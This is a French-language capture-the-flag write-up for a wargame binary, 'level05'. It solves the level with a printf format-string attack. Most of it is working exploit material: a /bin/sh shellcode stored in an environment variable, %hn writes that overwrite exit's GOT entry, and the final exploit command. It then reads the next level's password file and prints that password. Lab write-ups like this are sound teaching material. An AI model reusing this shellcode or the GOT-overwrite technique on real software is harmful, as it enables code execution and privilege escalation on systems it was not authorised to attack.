Creattion du source !

Convertit les majusclues en miniscules, puis le print avec un printf(string) !!

(python -c 'print "AAAA"+"%10$x"')|./level05
aaaa61616161

C'est notre 10e argument

On va donc modifier l'offset ou renvoie le EXIT system par notre SHELLCODE.

bjdump -R -M intel level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin@@GLIBC_2.0
080497d4 R_386_JUMP_SLOT   printf@GLIBC_2.0
080497d8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit@GLIBC_2.0
080497e4 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0


shellcode from gdb
USER=$(python -c 'print "\x30\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
maintenant il faut utiliser le %n de printf afin d'ecrire l'adresse de notre env a l'offset 080497e0


On recupere l'adresse de l'env USER. Attention il peut etre decallee de +/- 1;
./getenvaddr USER ./level05
USER will be at 0xffffd935

Ayant un buffer plus petite que 0xff on va utiliser l'option lenght de printf (%NBRx)
On va donc ecrire 2 ints le premier va ecrire 0xd935 (55605) dans la partie basse et 0xffff (65535) dans la partie haute de l'adresse dans GOT.

Avant d'arriver a note premier %hn nous trouvons 8 caracteres, don pour arriver a 0xd35 il faut ecrire (55605 - 8) 5597 caracteres.
Donc pour le seconde affin d'afficher 0xffff il faut ecricre (0xffff - 0xd935 = 9930).

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55597x"+ "%10$hn" +"%9930x" +"%11$hn"')

apres un test on voit qu'on segfault, donc il doit avoir un decallage de 0x1 sur l'adresse retournee var ./getenvaddr

BINGO !!

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55596x"+ "%10$hn" +"%9931x" +"%11$hn"' ; cat -) | ./level05
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
